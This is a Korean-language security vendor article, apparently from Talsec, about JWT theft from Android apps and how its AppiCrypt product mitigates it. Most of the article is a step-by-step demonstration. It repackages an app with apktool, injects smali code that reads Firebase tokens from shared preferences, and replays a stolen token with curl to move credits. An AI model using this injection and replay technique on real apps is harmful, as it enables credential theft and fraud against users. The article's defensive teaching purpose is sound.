---
title: "API JWT 하이재킹을 막는 방법"
description: ""
coverImage: "/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_0.png"
date: 2024-08-21 18:28
ogImage: 
  url: /assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_0.png
tag: Tech
originalTitle: "Protecting Your API from App Impersonation Token Hijacking Guide and Mitigation of JWT Theft"
link: "https://medium.com/@talsec/protecting-your-api-from-app-impersonation-token-hijacking-guide-and-mitigation-of-jwt-theft-48e744b76327"
isUpdated: true
updatedAt: 1724245542646
---


로컬에서 보유한 데이터 및 독립형 애플리케이션의 시대는 갔습니다. 스마트폰과 휴대용 장치의 등장으로 우리는 늘 길 위에 있으며, 소셜 커뮤니케이션부터 실시간 업데이트까지 모든 것에 네트워크 호출에 의존하고 있습니다. 그 결과로 백엔드 서버와 API 호출을 보호하는 것이 이전보다 더 중요해졌습니다.

![이미지](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_0.png)

## 토큰 기반 인증: 취약점과 해결책

대부분의 경우, 애플리케이션은 서버에 HTTP 요청을 보내기 위해 API를 사용합니다. 그런 다음 서버는 주어진 데이터로 응답합니다. 대부분의 개발자들이 이를 알고 항상 사용합니다. 그러나 우리는 종종 액세스가 제한된 데이터도 가지고 있습니다. 즉, 일부 사용자/개체만 얻을 수 있는 데이터가 있습니다. 게다가, 그들은 자신이 누군지를 증명해야 하는 방법을 제공해야 합니다.

<div class="content-ad"></div>

일반적으로 요청을 승인하고 데이터를 보호하기 위한 일반적인 방법은 서버가 서명한 토큰을 사용하는 것입니다. 인증 요청이 서버로 전송됩니다. 인증이 성공하면 서버는 서명된 토큰을 발급하고 클라이언트로 다시 전송합니다. 응용 프로그램은 모든 요청에 대해 해당 토큰을 사용하므로 서버는 승인된 엔티티와 통신 중임을 알 수 있습니다. 토큰은 유효 기간 동안 사용되지만 (보통 몇 분), 노출된 토큰을 수동으로 악용하는 데 충분히 시간이 걸립니다.

현재 일반적인 방법은 HTTPS를 통해 이러한 요청을 전달하는 것이며, TLS로 보호합니다. 전체 프로세스가 암호화되어 있으므로 공격자가 요청을 캐치해도 유용하지 않을 것입니다. 이는 통신의 기밀성을 보장하며, 공격자는 통신이 있음을 알지만 실제 내용을 모르게 됩니다.

## 앱 복제에 주의

그러나 해커가 공격할 기회가 아직도 있습니다 — 토큰을 도난당하도록 만들어진 허가받지 않은 클라이언트 애플리케이션을 사용한 공격입니다. 공격자는 토큰을 도난당한 후 타당한 응용 프로그램을 흉내 낼 수 있습니다. 서버는 제공된 토큰이 유효하고 새롭고 적절한 범위를 가지고 있는지만 확인할 뿐 타당한 응용 프로그램, 제3자 도구 (예: curl, Postman 등) 또는 각종 응용 프로그램이 통신하는지 확인할 수 없습니다 (힌트: 도난 당한 토큰도 여전히 유효합니다).

<div class="content-ad"></div>

앱이 공격당하고 손상되어 토큰을 도용하고 악용하는 경우가 있습니다. 몇 가지 명확한 예시를 여기에 소개합니다:

- 공격자가 루팅된 장치에 접근하면 토큰을 남용할 수 있습니다.
- 공격자가 앱의 변조된 버전을 만들고 배포하여 사용자가 설치하도록 속이고, 그런 다음 변조된 앱에서 유효한 토큰을 획득하여 자동화된 방법으로 남용할 수 있습니다.
- 원격 코드 실행 및 권한 상승 취약점은 계속 발견되고 있습니다. 자세한 내용은 https://source.android.com/docs/security/bulletin/asb-overview에서 확인할 수 있습니다.

이 데모에서는 두 번째 옵션에 초점을 맞출 것입니다.

이 문제들의 해결책은 클라이언트의 무결성을 확인하여 다음을 보장하는 것입니다:

<div class="content-ad"></div>

- 통신하는 당사자는 정품 클라이언트입니다 — 이는 Postman과 같은 다른 소스의 요청을 차단합니다.
- 통신하는 당사자는 신뢰할 수 있습니다 — 클라이언트의 무결성이 유지되고 안전한 공간(루팅되지 않은 장치 등)에서 실행되고 있습니다.

# JWT를 이용한 해킹 단계별 가이드: 사례 연구

고지: 우리는 합법적인 해킹 기술에 대한 정보를 제공하지만, 이 정보를 악용하는 것을 용납하지 않습니다. 교육 목적으로만 이 정보를 사용해주세요.

이 시연은 안드로이드 플랫폼에서 제시되었지만, iOS 버전도 유사하며 논의된 원칙과 고려사항은 동일합니다.

<div class="content-ad"></div>

상상 속의 회사인데 앱에서 급식 티켓을 현금 크레딧으로 제공합니다. 이 앱은 Firebase 인증을 사용하여 사용자를 인증합니다. 한 사람에서 다른 사람으로 크레딧을 전송하는 작업은 Firebase 클라우드 함수에서 처리됩니다. 어떤 사용자가 자신의 크레딧을 보내는지 식별하기 위해 JWT ID 토큰이 사용됩니다. 이 토큰은 사용자가 성공적으로 인증된 후 Firebase 인스턴스에서 검색할 수 있습니다.

이제 해킹 부분에 대한 개략적인 설명입니다.

![공격 개요](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_1.png)

## 단계 1: 앱 변조하기

<div class="content-ad"></div>

먼저, 애플리케이션 스코프 자체에 액세스해야 합니다. 이를 수행하는 여러 가지 방법이 있습니다. 대부분의 경우에는 기기를 루팅하면 필요한 액세스를 얻을 수 있습니다. 그러나 저희의 데모를 위해 애플리케이션 리패키징을 선택했습니다.

앱 조작은 현재 상당히 쉽습니다. 적절한 도구(apktool)를 사용하면 애플리케이션을 디컴파일하고 수정한 뒤 재패키징할 수 있습니다. 잠재적 피해자들에게 진짜처럼 보이는 앱을 다운로드하도록 유도하면 됩니다.

잠깐만요. 보통 사용자가 조작된 앱을 어디서 구할까요?

최선을 다해도 앱 스토어에서 암흑적인 앱을 찾을 수 있습니다. 대체 스토어와 사이드로딩의 등장으로 악성 소프트웨어를 더 많이 발견할 수 있습니다. 현실 세계 예시로는 일종의 이점을 제공한다고 약속하거나 보통 지불해야 하는 앱의 무료 버전일 수도 있습니다.

<div class="content-ad"></div>

## 단계 2: 토큰 훔치기

Tom의 API를 훔치고 공격하는 기사를 기억하시나요? 그렇지 않다면 한번 읽어보는 것을 권장합니다. Firebase는 중요한 정보를 공유된 환경 설정에 저장합니다. 이러한 데이터에 쉽게 액세스하고 구문 분석 할 수 있습니다. 그리고 API 호출에서 이를 남용할 수 있습니다.

![이미지](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_2.png)

## 단계 3: API 공격

<div class="content-ad"></div>

API 요청의 형식을 얻는 것은 스스로 프록시를 사용하여 할 수 있어요. 그 다음, Postman, curl 또는 다른 소프트웨어를 사용하여 도난당한 토큰을 사용하여 이를 재활용할 수 있어요.

"너무 추상적"인 것과 "너무 복잡한" 것 사이의 균형을 맞추기 위해 몇 가지 구현 세부 사항은 다음에 이야기할 시간을 위해 생략될 수 있어요.

# 계획을 실행하자

## 대상 APK 가져오기

<div class="content-ad"></div>

우선적으로, 우리는 애플리케이션의 가치 있는 APK 파일을 획득합니다. 이는 여러 방법으로 이루어질 수 있습니다. 여기서 설명하는 기술은 모든 개발자의 도구 상자에 있어야 할 표준 도구인 adb를 사용합니다.

앱을 설치한 후, 해당 앱의 패키지 이름을 얻어야 합니다. 터미널을 사용하여 다음 명령어를 통해 설치된 모든 앱/서비스의 패키지 이름을 나열할 수 있습니다:

```js
adb shell pm list packages
```

![이미지](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_3.png)

<div class="content-ad"></div>

이것은 꽤 방대한 패키지 목록입니다. 여기서 한 패키지를 찾기는 바늘을 건초더미에서 찾는 것 같습니다. com.android 또는 com.google로 시작하는 모든 패키지를 필터링하기 위해 grep 명령을 사용하면 많은 도움이 될 것입니다:

```js
adb shell pm list packages | grep -v ^'package:com.[google|android]'
```

<img src="/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_4.png" />

이렇게 하면 훨씬 짧고 깔끔한 목록이 얻어집니다. 게다가, 우리가 찾던 패키지 이름을 발견했습니다: com.mycompany.letseat

<div class="content-ad"></div>

이제 APK 파일이 저장된 경로를 얻어야 합니다. 이번에는 adb의 셸 기능을 사용할 것입니다.

```js
adb shell pm path com.mycompany.letseat
```

이 명령어는 APK가 위치한 경로를 반환합니다. adb pull을 사용하여 이 APK를 원하는 위치로 추출할 수 있습니다.

```js
adb pull (apk 위치)
```

<div class="content-ad"></div>


<img src="/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_5.png" />

이제 우리는 APK를 가지게 되었고 이를 조작할 것입니다. 다음 섹션에서는 APK를 디컴파일하고 수정한 후 새로 패키징할 것입니다.

## APK를 언패킹하고 악성 페이로드 만들기

이 부분에서는 주로 apktool을 사용할 것입니다. Apktool은 안드로이드 APK 파일의 역공학에 유용한 도구입니다. 제공된 링크에서 apktool을 다운로드할 수 있습니다.


<div class="content-ad"></div>

APK를 디컴파일하려면 apktool d 명령어를 사용할 거에요. 더 나은 가시성을 위해 출력 디렉토리를 설정할 거에요.

```js
apktool d -o=decompiled_apk base.apk
```

APK가 decompiled_apk 폴더로 추출되며 다음과 같은 구조를 갖습니다:

```js
.
└── decompiled_apk
    ├── AndroidManifest.xml
    ├── META-INF/
    ├── apktool.yml
    ├── assets/
    ├── kotlin/
    ├── lib/
    ├── original/
    ├── res/
    ├── smali/
    └── unknown/
```

<div class="content-ad"></div>

우리는 조금 놀면서 응용 프로그램을 어떻게 만지작거릴지 고민해보라고 추천합니다. 예를 들어 플러터 자산을 확인할 수 있습니다. 여기에 광고를 삽입할 수도 있습니다. 우리가 지금 신경 쓰는 것은 smali라는 폴더와 그 하위 폴더 com/mycompany/letseat입니다. (이 경로가 무엇을 상기시키나요?)

smali 폴더에는 플러터 앱의 안드로이드 부분의 디컴파일된 코드가 들어 있습니다. MainActivity.smali를 참고해 봅시다.

```js
.class public final Lcom/mycompany/letseat/MainActivity;
.super Lio/flutter/embedding/android/i;
.source ""


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lio/flutter/embedding/android/i;-><init>()V

    return-void
.end method
```

어떤 깨진 C# 버전 같네요. 그래서 이 smali라는 것이 뭔가요?

<div class="content-ad"></div>

스말리 코드는 안드로이드를 위한 사용자 정의 자바 가상 머신 인 Dalvik VM 에서 사용되는 어셈블리 언어입니다. 우리가 지금 한 작업은 박스맬링이라고 합니다 — Dalvik 파일(.dex)에서 스말리 코드를 가져오는 작업입니다. Apktool 은 이 "디컴파일"을 우리 대신 해주기 때문에 .dex 파일을 다룰 필요가 없습니다. 스말리 코드는 주로 역공학에 사용됩니다.

위 예제에서 여러분은 합리적인 추측을 할 수 있습니다 — init 함수가 호출되며, 이 함수는 io/flutter/embedding/android 패키지에 속해 있고, 함수 자체는 V 라는 파일에 있습니다. 이 추측을 확인해 봅시다.

io/flutter/embedding/android 경로가 존재하며, i.smali 라는 파일이 있습니다. 심지어 클래스 생성자인 `init`() 에 대한 여러 참조도 포함되어 있습니다.

그러나 여기서 더 흥미로운 점이 있습니다. 엉뚱한 이름이 아닌 몇 가지 이름을 살펴보세요: onCreate, onStart, onResume, onStop, onDestroy, ... 안드로이드 액티비티 수명주기처럼 보입니다. 확인해 보시기를 권장드립니다.

<div class="content-ad"></div>

지금 당장 알아야 할 것은 라이프사이클이란 앱이 상태를 변경할 때 호출되는 콜백의 그룹이라는 것입니다 (앱이 시작되었을 때, 앱이 백그라운드로 전환되었을 때, 기기가 회전했을 때 등). 우리는 onCreate를 코드를 삽입하는 곳으로 선택할 것입니다. 그러나 이 코드는 smali 코드로 작성되어야 합니다. 여기에는 두 가지 옵션이 있습니다:

- smali 코드에 직접 코드 작성하기 (그건 행운을 빕니다)
- Kotlin 또는 Java 코드를 작성한 다음, 컴파일된 코드를 분해하고 그것을 onCreate 메소드에 복사하기

우리는 두 번째 옵션을 선택할 것입니다. APK의 생성 및 컴파일 과정은 건너뛰고 커널 코드 자체가 가장 중요합니다:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 한 줄로 정의하여 onCreate에 삽입하기 쉽게 함
        steal();
    }

    public void steal() {
        // 소중한 데이터 가져오기
    }
}
```

<div class="content-ad"></div>

onCreate 메서드에서는 steal() 함수만 호출합니다. 그런 다음 도용 함수는 공유된 환경 설정을 찾아 모든 파일을 순회하고 해당 내용을 로그로 기록합니다 (이 기사를 간결하게 유지하기 위해 서버 호출은 로깅으로 대체되었습니다). 처음 실행할 때 (첫 번째 로그인/인증 전에 실행된 작업) "파일을 찾을 수 없음"이라는 메시지가 로깅됨을 주목해주세요.

```js
public void steal() {
  // 환경 설정 디렉토리 가져오기
  File prefsDir = new File(getApplicationInfo().dataDir, "shared_prefs");

  // 환경 설정이 있는지 확인...
  if (prefsDir.exists() && prefsDir.isDirectory()) {
    String[] files = prefsDir.list();
    // ... 그렇다면, 올바른 환경 설정 찾기
    if (files != null) {
      for (String file: files) {
        // 파일을 알고 있습니다. 서버로 보낼 수 있습니다.
        // (간결함을 위해 코드는 생략되었습니다).
        지금은 로깅으로 합시다.
        Scanner myReader;
        try {
          myReader = new Scanner(new File(prefsDir.getPath(), file));
          List < String > lines = new ArrayList < String > ();
          while (myReader.hasNextLine()) {
            lines.add(myReader.nextLine());
          }
          Log.e("JWT", lines.toString());
        } catch (FileNotFoundException e) {
          Log.e("JWT", "파일을 찾을 수 없음");
        }
      }
    }
  }
}
```

## Smali 코드 병합

이제 애플리케이션을 APK로 빌드한 다음 디컴파일할 수 있습니다. 디컴파일 후 MainActivity.smali 파일로 이동하여 steal() 함수를 찾습니다. steal() 함수의 smali 코드는 다음과 같습니다.

<div class="content-ad"></div>

```java
.method public final steal()V
    .locals 12

    .line 32
    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Lcom/example/myapplication/MainActivity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v1

    iget-object v1, v1, Landroid/content/pm/ApplicationInfo;->dataDir:Ljava/lang/String;

    const-string v2, "shared_prefs"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

...
```

지금 해야 할 일은 두 개의 smali 코드를 주의 깊게 병합하는 것입니다.

- steal() 호출을 MainActivity.smali에서 i.smali로 복사합니다.
- steal 함수를 MainActivity.smali에서 i.smali로 삽입합니다.
- i.smali에서 패키지 참조를 수정합니다.

검토 후 MainActivity.smali에서 steal() 함수 호출이 한 줄로 번역되었음을 확인할 수 있습니다.


<div class="content-ad"></div>


```js
invoke-virtual {p0}, Lcom/example/myapplication/MainActivity;->steal()V
```

하지만 이것은 잘못된 패키지 이름에서 호출되었습니다. 렛츠잇 앱의 모든 관련 기능은 i.smali 파일에 있으므로 해당 파일을 참조해야 합니다. 이를 수정해봅시다.

```js
invoke-virtual {p0}, Lio/flutter/embedding/android/i;->steal()V
```

또 다른 수술적 조작은 steal() 함수를 복사하는 것입니다. 복사한 후에는 패키지 참조도 업데이트해야 합니다.


<div class="content-ad"></div>

이 부분을 주의하세요. 애플리케이션 정보를 가져올 때 현재 인스턴스에 적용합니다. 패키지 참조는 따라서 MyApplication입니다.

```js
invoke-virtual {p0}, Lcom/example/myapplication/MainActivity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
```

이렇게하면 오류가 발생합니다. 왜냐하면 존재하지 않는 패키지를 참조하고 있기 때문에(“Let’s E`at” 앱의 “context”에서). 그러나 안드로이드 Activity에 대한 참조를 사용할 수 있습니다. 따라서 아래의 코드로 다시 작성하면 문제 없이 작동합니다.

```js
invoke-virtual {p0}, Landroid/app/Activity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
```

<div class="content-ad"></div>

## APK 다시 빌드하기

코드를 성공적으로 수정했습니다. 프로젝트를 APK로 다시 넣는 작업은 간단합니다. apktool을 사용하여 APK로 만들고, apksigner로 패키지에 서명합니다. 앱을 보호할 RASP 보호기능이 없기 때문에 기기에서 문제없이 설치될 것입니다.

APK를 다시 빌드하려면 디컴파일된 APK보다 한 단계 위로 올라가야 합니다(폴더 이름으로 참조할 수 있도록). 그런 다음 apktool을 사용합니다.

```js
apktool b 디컴파일된_apk
```

<div class="content-ad"></div>


![Protecting Your API from App Impersonation](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_6.png)

When decompiling, one downside is that the signature used for signing disappears. Therefore, manual signing becomes necessary. An unsigned package is not ideal as:

- It can't be uploaded to the app store
- It can't be installed properly (e.g., by dragging and dropping the APK onto the emulator)

To sign an APK, a key is required. As key generation is not covered in this article, we suggest referring to the official Android developers guide for guidance.


<div class="content-ad"></div>

서명에는 apksigner를 사용할 수 있어요.

```js
apksigner sign --ks=my-release-key.keystore base.apk
```

이제 JWT를 노출하는 악성 코드가 포함된 APK가 있어요.

# 유출된 JWT로 API 공격하기

<div class="content-ad"></div>

어플리케이션을 실행하면, 도난당한 페이로드의 형식을 볼 수 있습니다.

```js
{
   "cachedTokenState":{
      "refresh_token":"APJWN8eQaglkIjefuwj7Y0zE8RegoK_DMe82dA_2P00k2npXliwOT8wxseVYjBUZRWSSinie8wx8m3Q-6KuSxI3Gv1oJRQ6a6VtH-c6wmyTWQZsqUwQ_FdawC8pyvpcqos9DpKRj03vNl3mBX1WzSoWxKOwrKyDFNRtK3fs6eFkBDRBHMbWvNFqy3Hn2h_tWJUvN_cTH1egQH5YnAzd2TpxFrTTMxB1JyJ16--ELXlk9Yqi-QgEZ9nc",
      "access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NzZiNzIxNDAwYmZhZmEyOWQ0MTFmZTYwODE2YmRhZWMyM2IzODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vd2ViaW5hci0tLW1pc3N1c2Utand0IiwiYXVkIjoid2ViaW5hci0tLW1pc3N1c2Utand0IiwiYXV0aF90aW1lIjoxNjc3ODM0MTI4LCJ1c2VyX2lkIjoib1RKeDY0SHpZMFNkMkVSVFpvcjVnaG81Y2E5MyIsInN1YiI6Im9USng2NEh6WTBTZDJFUlRab3I1Z2hvNWNhOTMiLCJpYXQiOjE2Nzc4MzQxMjgsImV4cCI6MTY3NzgzNzcyOCwiZW1haWwiOiJkZXZlbG9wZXJAdGFsc2VjLmFwcCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJkZXZlbG9wZXJAdGFsc2VjLmFwcCJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.ODkew1FVJaklLA0rBOGke64XoOTYsnt4ONupuMywVwDVrw2JJlVeIf8FimPx...
      "expires_in":3600,
      "token_type":"Bearer",
      "issued_at":1677834112014
   },
   "applicationName":"[DEFAULT]",
   "type":"com.google.firebase.auth.internal.DefaultFirebaseUser",
   "userInfos":[
      {
         "userId":"oTJx64HzY0Sd2ERTZor5gho5ca93",
         "providerId":"firebase",
         "email":"developer@talsec.app",
         "isEmailVerified":false
      },
      {
         "userId":"developer@talsec.app",
         "providerId":"password",
         "email":"developer@talsec.app",
         "isEmailVerified":false
      }
   ],
   "anonymous":false,
   "version":"2",
   "userMetadata":{
      "lastSignInTimestamp":1677834128196,
      "creationTimestamp":1677833942740
   }
}
```

## Firebase API 호출

먼저 Firebase API를 쿼리해보겠습니다. 앱이 공개된 Firebase REST API를 가지고 있는 경우 유용합니다.

<div class="content-ad"></div>

Firebase 프로젝트에서 project_id를 가져와야 합니다:

![project_id](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_7.png)

둘째로, Firebase 파일에서 key-value 쌍 refresh_token과 access_token을 확인하세요.

이러한 토큰들은 project_id와 함께 쉽게 오용될 수 있습니다. 엔드포인트가 동일하기 때문에 유효한 값을 제공하기만 하면 됩니다. 이러한 토큰들의 유효기간이 제한적이며 자주 새로운 토큰을 가져와야 할 것입니다.

<div class="content-ad"></div>

```js
# PROJECT_ID - firebase 프로젝트 ID (위의 콘솔 출력 참조)
# ACCESS_TOKEN - 유출된 payload의 access_token 값
curl 'https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=$PROJECT_ID' -H 'Content-Type: application/json' --data-binary '{"idToken":"$ACCESS_TOKEN"}'
```

이 요청은 더 많은 데이터를 반환합니다.

```js
{
    "kind": "identitytoolkit#GetAccountInfoResponse",
    "users": [
        {
            "localId": "oTJx64HzY0Sd2ERTZor5gho5ca93",
            "email": "developer@talsec.app",
            "passwordHash": "UkVEQUNURUQ=",
            "emailVerified": false,
            "passwordUpdatedAt": 1677833942740,
            "providerUserInfo": [
                {
                    "providerId": "password",
                    "federatedId": "developer@talsec.app",
                    "email": "developer@talsec.app",
                    "rawId": "developer@talsec.app"
                }
            ],
            "validSince": "1677833942",
            "disabled": false,
            "lastLoginAt": "1678363781388",
            "createdAt": "1677833942740",
            "lastRefreshAt": "2023-03-09T12:09:41.388Z"
        }
    ]
}
```

이 프로젝트 ID가 어디에서 왔는지 궁금하다면, Firebase 콘솔에서 찾을 수 있는 google-services.json 파일입니다.

<div class="content-ad"></div>

<img src="/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_8.png" />

## 어택: "Let’s Eat" 앱 API

요청 형식을 얻는 것이 가능합니다. Flutter의 경우 reFlutter를 사용할 수 있습니다. 더 일반적인 접근 방식은 프록시를 사용하는 것입니다. 약간의 시간을 들이면 예시 앱의 POST 요청 형식을 얻을 수 있습니다:

```js
요청 타입: POST,
헤더: {
  Content-Type: "application/json",
  Authorization: "eyJhbGciOiJSUzI1NiIsImtpZCI6I..."
},
바디: {
  "amount": 132,
  "recipient": "Joe Example",
}
```

<div class="content-ad"></div>

아래는 예제에서 요청 변조 방법을 헤더에 access_token을 제공하여 수행하는 방법입니다.

```js
curl 'https://letseat-example.com' -H 'Content-Type: application/json' -H 'Authorization: $access_token' --data-binary '{"amount": 150, "recipient": "Fiskus Kuskus"}'
```

도난당한 돈을 성공적으로 이체하였습니다.

```js
{
   "status":"success",
   "msg":"oTJx64HzY0Sd2ERTZor5gho5ca93에서 Fiskus Kuskus로 150 송금 완료"
}
```

<div class="content-ad"></div>

# 문제 완화 방법: AppiCrypt

이 사칭을 방지하기 위해 "제로 신뢰" 보안 모델을 구현한 추가적인 보안 제어인 AppiCrypt를 추가함으로써 안전을 보장할 수 있습니다. "제로 신뢰"는 모든 기기와 애플리케이션이 기본적으로 신뢰할 수 없다고 가정합니다. 전통적인 보안 조치에 의존하는 대신, 제로 신뢰는 보호된 자원에 액세스하려면 기기와 애플리케이션을 인증하고 승인하는 다양한 보안 제어를 활용합니다. 이는 OWASP MAS 요구 사항인 MASVS-RESILIENCE 및 MASVS-AUTH 제어 그룹과 일치합니다.

AppiCrypt는 모바일 앱 및 기기 무결성 상태 제어를 활용하여 백엔드 API를 보호함으로써 사용하기 쉽습니다. 이를 통해 원본 API 호출만이 원격 서비스와 통신할 수 있습니다.

이는 백엔드 측의 스크립트에 의해 평가된 고유한 앱 암호화 랜덤 값을 생성함으로써 세션 탈취(방금 전에 시연한 것과 같은), 봇 공격 또는 애플리케이션 사칭과 같은 위협을 감지하고 방지합니다.

<div class="content-ad"></div>

이 기술의 아이디어는 API를 보호하는 데 그치는 것이 아니라 RASP(런타임 응용프로그램 자가보호) 컨트롤이 공격자에 의해 극복되거나 비활성화되었음을 백엔드에 알리는 데 있습니다. 따라서 게이트웨이는 App 무결성이 침해되었을 경우 세션을 쉽게 차단할 수 있으며, 백엔드는 RASP 컨트롤을 확인한 후에만 API 호출을 처리합니다.

![이미지](/assets/img/2024-08-21-ProtectingYourAPIfromAppImpersonationTokenHijackingGuideandMitigationofJWTTheft_9.png)

## 암호화 헤더

Cryptogram은 헤더에 삽입됩니다. 메시지의 페이로드를 변경할 필요가 없습니다.

<div class="content-ad"></div>

```js
// 요청에 대한 암호문을 반환합니다
String cryptogram = Talsec.getAppiCrypt(...);
```

```js
client.post(url, headers: {"AppiCrypt": cryptogram}, body: body);
```

암호문 자체는 암호화된 일회용 값입니다. 이것을 수정할 수 없으며, 암호문이 포함된 페이로드를 도난당해도 쓸모가 없습니다. 암호문은 간단히 재사용할 수 없습니다. 논스를 사용하면 암호문이 당신의 API 호출에 속해있고 공격자가 재생할 수 없음을 알 수 있습니다. 예전 암호문을 사용하면 해당 확인에 실패합니다(서버는 코드 403으로 응답합니다):

```js
{"message":"Forbidden"}
``` 

<div class="content-ad"></div>

AppiCrypt이 뛰어난 점은 통합성입니다. 외부 API와의 통합이 필요하지 않습니다. 저속 지연을 보장하며 단일 장애점을 도입하지 않습니다. 암호화문은 백엔드에서 간단한 스크립트를 로컬로 실행하여 확인됩니다. AppiCrypt은 구글 플레이나 다른 OEM 서비스에 의존하지 않고 모든 종류의 iOS 및 Android 장치에 대한 일반적인 솔루션입니다.

비슷한 기술인 Firebase AppCheck을 접하셨을 수 있습니다. AppCheck과 AppiCrypt 간의 중요한 차이점을 강조하고 싶습니다. AppCheck은 모든 호출에 적용되는 것이 아니라 사용자 등록 중에만 적용됩니다. 이는 토큰 도난이 가능한 공간을 남겨둔다는 것을 의미합니다. 토큰 유출을 방지하는 것이 아니라 토큰 발급을 막는다는 점입니다. 이러한 기술들을 이전 글에서 비교했습니다.

AppiCrypt에 대한 자세한 내용은 저희 웹사이트에서 확인하실 수 있습니다.

# 결론

<div class="content-ad"></div>

이 기사에서는 모바일 애플리케이션을 공격하는 한 가지 방법을 살펴보았습니다. 앱에서 Firebase 토큰을 훔쳐 API를 공격하는 방법을 보여드렸고, APK 파일이 해체되는 과정과 smali 코드가 무엇인지 그리고 악의적인 코드를 추가하는 방법을 설명했습니다. 마지막으로, 이 공격으로부터 어떻게 자신을 보호할 수 있는지 배웠습니다.

이 기사는 안드로이드 플랫폼을 중점적으로 다뤘지만, iOS나 다른 모바일 시스템에서도 유사한 문제가 발생할 수 있습니다. 사용자의 관점에서는 신뢰할 수 없는 소스에서 애플리케이션을 다운로드하고 사용할 때 주의해야 하며, 권한 및 리뷰를 확인해야 합니다. 개발자의 관점에서는 모바일 보안이 지속적으로 발전하는 분야이며 주의를 기울이고 지식을 업데이트해야 하는 중요성이 있습니다.

이 기사가 모바일 보안과 관련된 위험 요소를 이해하고 그 위험을 최소화하는 방법을 배울 수 있게 도와드렸기를 바랍니다.

# 기업 서비스

<div class="content-ad"></div>

우리는 상업용 고객을 위해 자체 호스팅된 클라우드 플랫폼을 통해 앱 및 API 보호를 강화하고 세부적으로 구성 가능한 위협 대응, 즉각적인 경보, 제품의 침투 테스트를 제공합니다.

시장에서 유례없는 포괄적인 모바일 솔루션 보안 요소가 포함되어 있습니다:
- RASP+ SDK는 앱 내부 보호 및 차폐를 제공합니다.
- AppiCrypt SDK는 API 남용에 대항합니다.
- App 보안 강화 SDK에는 Dynamic TLS 인증서 핀팅 SDK, SDK 내의 App 비밀 보호, 앱 데이터 암호화 및 복호화가 포함되어 있습니다.

PSD2 RT 및 eIDAS를 준수하는 가장 고급 보호를 찾고 있고, 전문가들의 지원이 필요하다면 https://talsec.app에서 저희와 연락하세요. freeRASP와 RASP+ SDK 간의 차이에 대해 자세히 알아보려면 이 페이지를 방문해주세요: https://github.com/orgs/talsec/discussions/5.
https://talsec.app | info@talsec.app

<div class="content-ad"></div>

작성자: 플러터 개발자 Jaroslav Novotný, 보안 컨설턴트 Tomáš Soukal, 백엔드 개발자 Tomáš Biloš